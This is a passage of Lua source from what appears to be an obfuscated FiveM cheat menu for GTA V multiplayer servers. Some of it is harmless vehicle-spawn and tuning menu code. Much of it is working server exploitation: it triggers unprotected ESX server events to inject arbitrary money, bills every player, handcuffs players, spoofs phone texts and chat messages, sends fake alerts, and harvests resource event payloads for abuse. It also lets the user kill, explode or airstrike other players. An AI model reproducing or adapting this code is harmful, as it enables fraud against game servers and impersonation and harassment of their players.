				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('sports')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localsuper') then
			for i = 1, #VehicleClass.super do
				local modelName = VehicleClass.super[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('super')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localmotorcycles') then
			for i = 1, #VehicleClass.motorcycles do
				local modelName = VehicleClass.motorcycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('motorcycles')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localoffroad') then
			for i = 1, #VehicleClass.offroad do
				local modelName = VehicleClass.offroad[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('offroad')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localindustrial') then
			for i = 1, #VehicleClass.industrial do
				local modelName = VehicleClass.industrial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('industrial')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localutility') then
			for i = 1, #VehicleClass.utility do
				local modelName = VehicleClass.utility[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('utility')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localvans') then
			for i = 1, #VehicleClass.vans do
				local modelName = VehicleClass.vans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('vans')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localcycles') then
			for i = 1, #VehicleClass.cycles do
				local modelName = VehicleClass.cycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('cycles')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localboats') then
			for i = 1, #VehicleClass.boats do
				local modelName = VehicleClass.boats[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('boats')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localhelicopters') then
			for i = 1, #VehicleClass.helicopters do
				local modelName = VehicleClass.helicopters[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('helicopters')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localplanes') then
			for i = 1, #VehicleClass.planes do
				local modelName = VehicleClass.planes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('planes')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localservice') then
			for i = 1, #VehicleClass.service do
				local modelName = VehicleClass.service[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('service')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localcommercial') then
			for i = 1, #VehicleClass.commercial do
				local modelName = VehicleClass.commercial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('commercial')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LSC") then
			if fjustimen.Player.IsInVehicle then
				if fjustimenUI.NgPSWlTpNm("Bodywork", "lsc_bodywork") then
					EbEFecYGjP.GeEFnatGQP()
				end
				if fjustimenUI.NgPSWlTpNm("Performance Tuning", "lsc_performance") then
					EbEFecYGjP.GeEFnatGQP()
				end
			else
				if fjustimenUI.GwGoBeHRde("No vehicle found") then
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("lsc_bodywork") then
			local installed = currentMods
			if fjustimen.Player.IsInVehicle then
				for i, mod in pairs(EbEFecYGjP.vehicleMods) do
					SetVehicleModKit(fjustimen.Player.Vehicle, 0)
					local modCount = GetNumVehicleMods(fjustimen.Player.Vehicle, mod.id)
					if modCount > 0 then
						if mod.meta == "modFrontWheels" or mod.meta == "modBackWheels" then
							if fjustimenUI.ComboBox(mod.name, EbEFecYGjP.WheelType, installed['wheels'], function(selectedIndex, selectedItem)
								selectedIndex = selectedIndex - 1
								installed['wheels'] = selectedIndex
								SetVehicleWheelType(fjustimen.Player.Vehicle, selectedIndex)
								fjustimenUI.iDNuClwTMv(mod.meta, selectedItem .. " Wheels")
							end, true) then
								if modCount > 0 then
									vKuBqBMrNu(mod.meta, true)
								end
							end
						else
							if fjustimenUI.NgPSWlTpNm(mod.name, mod.meta) then end
						end
					end

					if mod.meta == "modXenon" then
						if fjustimenUI.GaNIUyizUH(mod.name, installed['modXenon']) then
							ToggleVehicleMod(fjustimen.Player.Vehicle, 22, not installed['modXenon'])
							EbEFecYGjP.GeEFnatGQP()
						end

						if installed['modXenon'] then
							if fjustimenUI.ComboBox("Xenon Color", tSyjzWZfIi.XenonColor.Words, tSyjzWZfIi.XenonColor.Selected, function(selectedIndex)	
								if tSyjzWZfIi.XenonColor.Selected ~= selectedIndex then
									tSyjzWZfIi.XenonColor.Selected = selectedIndex
								end
							end) then
								SetVehicleXenonLightsColour(fjustimen.Player.Vehicle, tSyjzWZfIi.XenonColor.Values[tSyjzWZfIi.XenonColor.Selected])
							end
							
						end
					end
				end
			else
				if fjustimenUI.GwGoBeHRde("No vehicle found") then
				end
			end
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("lsc_performance") then
			local installed = currentMods
			if fjustimen.Player.IsInVehicle then
				SetVehicleModKit(fjustimen.Player.Vehicle, 0)
				for i, type in pairs(EbEFecYGjP.perfMods) do
					local modCount = GetNumVehicleMods(fjustimen.Player.Vehicle, type.id)
					if modCount > 0 then
						if fjustimenUI.pJZvwZInDS(type.name, VehicleUpgradeWords[modCount], installed[type.meta], function(selectedIndex)
							selectedIndex = selectedIndex - 2
							installed[type.meta] = selectedIndex
							SetVehicleMod(fjustimen.Player.Vehicle, type.id, selectedIndex, false)
						end, true) then end
					end
				end

				if fjustimenUI.GaNIUyizUH("Turbo", installed['modTurbo'], function(enabled)
					installed['modTurbo'] = enabled
					ToggleVehicleMod(fjustimen.Player.Vehicle, 18, enabled)
				end) then end
				
				if fjustimenUI.ComboBox("Engine Power", tSyjzWZfIi.EnginePower.Words, tSyjzWZfIi.EnginePower.Selected, function(selectedIndex)
					if tSyjzWZfIi.EnginePower.Selected ~= selectedIndex then
						tSyjzWZfIi.EnginePower.Selected = selectedIndex
						ModifyVehicleTopSpeed(fjustimen.Player.Vehicle, tSyjzWZfIi.EnginePower.Values[tSyjzWZfIi.EnginePower.Selected])
					end
				end) then 
				end

				
			else
				if fjustimenUI.GwGoBeHRde("No vehicle found") then
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("ServerMenu") then
			fjustimenUI.iDNuClwTMv("ServerMenu", "Server Options - " .. GetCurrentServerEndpoint())
			if fjustimenUI.NgPSWlTpNm("Models List", "ServerResources") then end
			if fjustimenUI.NgPSWlTpNm("~w~Polish ~r~Servers", "ServerTriggers") then end
			--if fjustimenUI.NgPSWlTpNm("ESX Boss Options", "ESXBoss") then end
			--if fjustimenUI.NgPSWlTpNm("Money Options", "ServerMoneyOptions") then end
			--if fjustimenUI.NgPSWlTpNm("ESX Misc Options", "ESXMisc") then end
			--if fjustimenUI.NgPSWlTpNm("ESX Drug Options", "ESXDrugs") then end
			--if fjustimenUI.NgPSWlTpNm("VRP Options", "VRPOptions") then end
			if fjustimenUI.NgPSWlTpNm("Misc Options", "MiscServerOptions") then end

			fjustimenUI.pyCDRpSJBU()
			
		elseif fjustimenUI.aWlfWfxYaq("MenuSettings") then
			if fjustimenUI.NgPSWlTpNm("Change Color Theme", "MenuSettingsColor") then
			end
			if fjustimenUI.GwGoBeHRde("~r~Kill Menu") then
				isMenuEnabled = false
			end
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("MenuSettingsColor") then
			if fjustimenUI.GaNIUyizUH("Dynamic Theme", dynamicColorTheme, function(enabled) dynamicColorTheme = enabled end) then
			end
			if fjustimenUI.GwGoBeHRde("Red", nil, themeColors.red) then
				_menuColor.base = themeColors.red
			end
			if fjustimenUI.GwGoBeHRde("Orange", nil, themeColors.orange) then
				_menuColor.base = themeColors.orange
			end
			if fjustimenUI.GwGoBeHRde("Yellow", nil, themeColors.yellow) then
				_menuColor.base = themeColors.yellow
			end
			if fjustimenUI.GwGoBeHRde("Green", nil, themeColors.green) then
				_menuColor.base = themeColors.green
			end
			if fjustimenUI.GwGoBeHRde("Blue", nil, themeColors.blue) then
				_menuColor.base = themeColors.blue
			end
			if fjustimenUI.GwGoBeHRde("Purple", nil, themeColors.purple) then
				_menuColor.base = themeColors.purple
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("ServerResources") then
			if fjustimenUI.GwGoBeHRde("~b~Jesus") then
				local model = "u_m_m_jesus_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end	
			end
			if fjustimenUI.GwGoBeHRde("~b~Clown") then
				local model = "s_m_y_clown_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Lion") then
				local model = "a_c_mtlion"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Dzik") then
				local model = "a_c_boar"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
					end
			end
			if fjustimenUI.GwGoBeHRde("~b~Swat") then
				local model = "s_m_y_swat_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Stripper") then
				local model = "s_f_y_stripper_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Cop") then
				local model = "s_m_y_cop_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Chimp") then
				local model = "a_c_chimp"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Alien") then
				local model = "s_m_m_movalien_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Adult") then
				local model = "a_m_o_acult_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Pongo") then
				local model = "u_m_y_pogo_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Babyd") then
				local model = "u_m_y_babyd"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Husky") then
				local model = "a_c_husky"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Rat") then
				local model = "a_c_rat"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Niko") then
				local model = "mp_m_niko_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Ballas") then
				local model = "g_m_y_ballasout_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Diler") then
				local model = "s_m_y_dealer_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			end
			if fjustimenUI.GwGoBeHRde("~b~Fivem skin") then
				local model = "mp_m_freemode_01"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
					end
			end
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq('ResourceData') then
			fjustimenUI.iDNuClwTMv('ResourceData', SelectedResource .. " > Data")
			if fjustimenUI.NgPSWlTpNm('Event Handlers', 'ResourceCEvents') then end
			if fjustimenUI.NgPSWlTpNm('Server Events', 'ResourceSEvents') then end
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq('ResourceCEvents') then
			fjustimenUI.iDNuClwTMv('ResourceCEvents', SelectedResource .. " > Data > Event Handlers")
			for key, name in pairs(validResourceEvents[SelectedResource]) do
				if fjustimenUI.GwGoBeHRde(name) then
					print(key)
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('ResourceSEvents') then
			fjustimenUI.iDNuClwTMv('ResourceSEvents', SelectedResource .. " > Data > Server Events")
			if validResourceServerEvents[SelectedResource] ~= nil then
				for name, payload in pairs(validResourceServerEvents[SelectedResource]) do
					if fjustimenUI.GwGoBeHRde(name) then
						local tbl = msgpack.unpack(payload)
						local buffer = name .. "("
						for k, v in ipairs(tbl) do
							buffer = (buffer .. tostring(v) .. (k == #tbl and ")" or ", "))
						end

						if #tbl == 0 then
							buffer = (buffer .. ")")
						end
						
						print("^2" .. buffer)
					end
				end
				
			end
			
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("ESXBoss") then

			if fjustimenUI.GwGoBeHRde("~c~Mechanic") then
				TriggerEvent("esx_society:openBossMenu", "mecano", function(data, menu) vKuBqBMrNu(currentMenu, false) end)
				
			elseif fjustimenUI.GwGoBeHRde("~b~Police") then
				TriggerEvent("esx_society:openBossMenu","police",function(data, menu) vKuBqBMrNu(currentMenu, false) end)
			elseif fjustimenUI.GwGoBeHRde("~r~Ambulance") then
				TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu) vKuBqBMrNu(currentMenu, false) end)
			elseif fjustimenUI.GwGoBeHRde("~y~Taxi") then
				TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu) vKuBqBMrNu(currentMenu, false) end)
			elseif fjustimenUI.GwGoBeHRde("~g~Real Estate") then
				TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu) vKuBqBMrNu(currentMenu, false) end)
			elseif fjustimenUI.GwGoBeHRde("~p~Gang") then
				TriggerEvent("esx_society:openBossMenu","gang",function(data, menu) vKuBqBMrNu(currentMenu, false) end)
			elseif fjustimenUI.GwGoBeHRde("~o~Car Dealer") then
				TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu) vKuBqBMrNu(currentMenu, false) end)
			elseif fjustimenUI.GwGoBeHRde("~y~Banker") then
				TriggerEvent("esx_society:openBossMenu","banker",function(data, menu) vKuBqBMrNu(currentMenu, false) end)  
			end

			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("ServerMoneyOptions") then

			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~Caution Give Back") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('esx_jobs:caution', 'give_back', result, 0, 0)
				end
			end
			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~TruckerJob Pay") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			end
			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~Admin Give Bank") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveBank', result)
				end
			end
			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~Admin Give Cash") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveCash', result)
				end
			end
			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~GOPostalJob Pay") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			end
			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~BankerJob Pay") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			end
			if fjustimenUI.GwGoBeHRde("~g~ESX ~y~Slot Machine") then
				local result = RNDpymkwNb("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			end

			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("ESXMisc") then

			if fjustimenUI.GwGoBeHRde("~w~Set hunger to ~g~100%") then
				TriggerEvent("esx_status:set", "hunger", 1000000)
			elseif fjustimenUI.GwGoBeHRde("~w~Set thirst to ~g~100%") then
				TriggerEvent("esx_status:set", "thirst", 1000000)
			elseif fjustimenUI.GwGoBeHRde("~g~ESX ~y~Revive ID") then
				local id = RNDpymkwNb("Enter Player ID", "", 1000)
				if id then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(id))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(id))
					TriggerServerEvent("paramedic:revive", GetPlayerServerId(id))
					TriggerServerEvent("ems:revive", GetPlayerServerId(id))
				end
			elseif fjustimenUI.GwGoBeHRde("Send All Bill (shitlord)") then
				local amount = RNDpymkwNb("Enter Amount", "", 100000000)
				  local name = RNDpymkwNb("Enter the name of the Bill", "", 100000000)
				  if amount and name then
					for i = 0, 256 do
						  TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
					end
				end
			elseif fjustimenUI.GwGoBeHRde("Handcuff ID") then
				local id = RNDpymkwNb("Enter Player ID", "", 3)
				if id then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(id))
				end
			elseif fjustimenUI.GwGoBeHRde("~g~ESX ~w~Get all licenses") then
				TriggerServerEvent('esx_dmvschool:addLicense', dmv)
				TriggerServerEvent('esx_dmvschool:addLicense', drive)
				TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
				TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
			end

			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("MiscServerOptions") then

			if fjustimenUI.GwGoBeHRde("Send Discord Message") then
				local Message = RNDpymkwNb("Enter message to send", "", 100)
				TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
				fjustimenUI.SendNotification({text = "Sent message:~n~" .. Message .. "", type = "success"})
			elseif fjustimenUI.GwGoBeHRde("Send ambulance alert on waypoint") then
				local playerPed = PlayerPedId()
				if DoesBlipExist(GetFirstBlipInfoId(8)) then
					local blipIterator = GetBlipInfoIdIterator(8)
					local blip = GetFirstBlipInfoId(8, blipIterator)
					WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
					TriggerServerEvent('esx_addons_gcphone:startCall', 'ambulance', "medical attention required: unconscious citizen!", WaypointCoords)
					fjustimenUI.SendNotification("~g~Ambulance alert sent to waypoint!")
				else
					fjustimenUI.SendNotification("~r~No waypoint set!")
				end

			elseif fjustimenUI.GwGoBeHRde("Spoof text message (GCPHONE)") then
				local transmitter = RNDpymkwNb("Enter transmitting phone number", "", 10)
				local receiver = RNDpymkwNb("Enter receiving phone number", "", 10)
				local message = RNDpymkwNb("Enter message to send", "", 100)
				if transmitter then
					if receiver then
						if message then
							TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, message, 0)
						else
							fjustimenUI.SendNotification("~r~You must specify a message.")
						end
					else
						fjustimenUI.SendNotification("~r~You must specify a receiving number.")
					end
				else
					fjustimenUI.SendNotification("~r~You must specify a transmitting number.")
				end
			elseif fjustimenUI.GwGoBeHRde("Spoof Chat Message") then
				local name = RNDpymkwNb("Enter chat sender name", "", 15)
				local message = RNDpymkwNb("Enter your message to send", "", 70)
				if name and message then
					TriggerServerEvent('_chat:messageEntered', name, {0, 0x99, 255}, message)
				end
			elseif fjustimenUI.GwGoBeHRde("esx_mugging Give item") then
				local itemName = RNDpymkwNb("Enter item name", "", 20)
				if itemName then
					TriggerServerEvent('esx_mugging:giveItems', (itemName))
					fjustimenUI.SendNotification("Successfully given item ~g~" .. itemName)
				else
					fjustimenUI.SendNotification("~r~You must specify an item")
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("OnlinePlayersMenu") then
			VInZHjFfNV = {}
			
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				VInZHjFfNV[i] = id -- equivalent to table.insert(table, value) but faster

				if fjustimenUI.NgPSWlTpNm(("~b~%-4d ~s~%s"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
					SelectedPlayer = id
				end
			end

			local index = menus[currentMenu].currentOption

			fjustimenUI.LWmTkinCNg(VInZHjFfNV[index])
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("PlayerOptionsMenu") then
			fjustimenUI.iDNuClwTMv("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
			
			if fjustimenUI.GwGoBeHRde("Spectate","~b~Might Be Detected", (fjustimen.Player.Spectating and "~g~[SPECTATING]")) then
				LUtjuLMzHY(function()
					lgwgqOpcaw(SelectedPlayer)
				end)
			end

			if fjustimenUI.GwGoBeHRde("Teleport To Player", "~r~Native") then
				fjustimen.Game:TeleportToPlayer(SelectedPlayer)
			end

			if fjustimenUI.GwGoBeHRde("Teleport into Vehicle", "~r~Native") then
				idAcOhFwAt(SelectedPlayer)
			end

			if fjustimenUI.NgPSWlTpNm("Weapon Options", "OnlineWepMenu") then end
			if fjustimenUI.NgPSWlTpNm("Vehicle Options", "OnlineVehicleMenuPlayer") then end
			if fjustimenUI.NgPSWlTpNm("ESX Options", "ESXMenuPlayer") then end
			if fjustimenUI.NgPSWlTpNm("Troll Options", "OnlineTrollMenu") then end
			if fjustimenUI.GwGoBeHRde("~r~Silent Explode", "~r~Native") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
			end

			if fjustimenUI.GwGoBeHRde("~y~Explode", "~r~Native") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
			end

			if fjustimenUI.GwGoBeHRde("Give All Weapons", "~r~Native") then
				for i = 1, #t_Weapons do
					GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 128, false, false)
				end
			end
			if fjustimenUI.GwGoBeHRde("Remove All Weapons", "~r~Native") then
				local ped = GetPlayerPed(SelectedPlayer)
				hfSPELVLBp(ped)
				for i = 1, #t_Weapons do
					RemoveWeaponFromPed(ped, t_Weapons[i][1])
				end
            end
            
            if fjustimenUI.GwGoBeHRde("Clone Outfit", "~r~Native") then
                TlEinQlrUD.WBjFDwrZUo(SelectedPlayer)
            end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
        elseif fjustimenUI.aWlfWfxYaq("OnlineTrollMenu") then
            
            if fjustimenUI.GwGoBeHRde("Attach Custom Prop To Player", "~r~Native") then
                local hamburg = RNDpymkwNb("Enter prop name", "", 100)
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end
            
			if fjustimenUI.GwGoBeHRde("Airstrike", "~r~Native") then
				sEzemrvIGm(SelectedPlayer)
			end

			if fjustimenUI.GwGoBeHRde("Taze Player", "~r~Native") then
				IJBgblLdXP(SelectedPlayer)
            end
            
			
			if fjustimenUI.GwGoBeHRde("Nearby Peds Attack Player", "~r~Native") then
				LOgtuivgXj(selectedPlayer) 
			end

			if fjustimenUI.GwGoBeHRde("~b~XD ~r~PLAYER", "~r~Native") then
			local hashball = "stt_prop_stunt_soccer_ball"
                        while not HasModelLoaded(GetHashKey(hashball)) do
                          Citizen.Wait(0)
                          RequestModel(GetHashKey(hashball))
                        end
                        local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
                        SetEntityVisible(ball, 0, 0)
                        AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)

			end

            if fjustimenUI.GwGoBeHRde("~r~Kill Player", "~r~Native") then
				SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
            end

            if fjustimenUI.GwGoBeHRde("~y~Spawn Enemies", "~r~Native") then
                TlEinQlrUD.iUeDtxZvTu(GetPlayerPed(selectedPlayer), "a_m_y_skater_01")
            end

            if fjustimenUI.GwGoBeHRde("~y~Spawn Heli Enemies", "~r~Native") then
